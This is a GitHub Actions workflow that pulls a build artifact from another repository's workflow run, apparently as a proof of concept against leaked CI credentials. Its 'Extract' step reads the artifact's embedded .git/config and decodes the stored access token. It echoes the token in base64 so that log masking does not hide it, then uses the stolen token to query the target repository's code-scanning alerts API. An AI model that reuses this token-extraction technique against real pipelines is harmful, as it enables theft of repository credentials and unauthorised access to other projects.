# This is a basic workflow to help you get started with Actions

name: Downloader
# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:
    inputs:
        runid:
          type: string
          description: Workflow run id to download artifacts from

env:
  TARGET_REPO: nicheexpress/penrose
  ARTIFACT: diagrams

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it

      - name: Use checkout
        uses: actions/checkout@v4.1.1

      - name: Install jq
        uses: dcarbone/install-jq-action@v2.1.0
            
      - name: Wait
        run: |      
          chmod +x script.sh
          ./script.sh ${{ secrets.GITHUB_TOKEN }} $TARGET_REPO" ${{ github.event.inputs.runid }}
               
      - uses: actions/download-artifact@v4.1.0
        with:
          name: go-result
          path: /tmp
          github-token: ${{ secrets.GITHUB_TOKEN }} # token with actions:read permissions on target repo
          repository: $TARGET_REPO
          run-id: ${{ github.event.inputs.runid }}

      - name: Extract
        run: |        
          ls /tmp
          cd /tmp/.git
          cat config | base64
          token=$(grep -o 'basic .*' config | sed "s|basic ||g" | base64 -d | sed "s|x-access-token:||g")
          echo this is a token $token
          echo $token | base64

          #curl --location 'https://api.github.com/repos/$TARGET_REPO/code-scanning/alerts' --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
          curl --location 'https://api.github.com/repos/$TARGET_REPO/code-scanning/alerts' --header "Authorization: Bearer $token"

        
